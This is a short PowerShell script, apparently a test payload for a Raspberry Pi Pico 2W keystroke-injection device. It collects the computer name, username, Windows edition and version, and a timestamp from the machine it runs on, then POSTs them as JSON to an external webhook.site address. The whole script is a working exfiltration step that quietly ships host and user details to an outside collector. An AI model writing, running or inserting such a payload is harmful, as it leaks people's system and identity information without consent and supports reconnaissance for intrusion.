$webhook = 'https://webhook.site/3fa59b0e-4157-4c9e-a72b-4803657bd464'
$info = [ordered]@{
    Tipo           = 'PICO2W_TEST'
    Equipo         = $env:COMPUTERNAME
    Usuario        = $env:USERNAME
    Windows        = (Get-CimInstance Win32_OperatingSystem).Caption
    Version        = (Get-CimInstance Win32_OperatingSystem).Version
    FechaHora      = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    CarpetaPrueba  = "$env:USERPROFILE\Desktop\PICO2W_TEST"
}

$mensaje = $info | ConvertTo-Json -Compress

Invoke-WebRequest -UseBasicParsing `
    -Uri $webhook `
    -Method POST `
    -ContentType 'application/json; charset=utf-8' `
    -Body $mensaje

Write-Host 'PICO2W: información de prueba enviada'
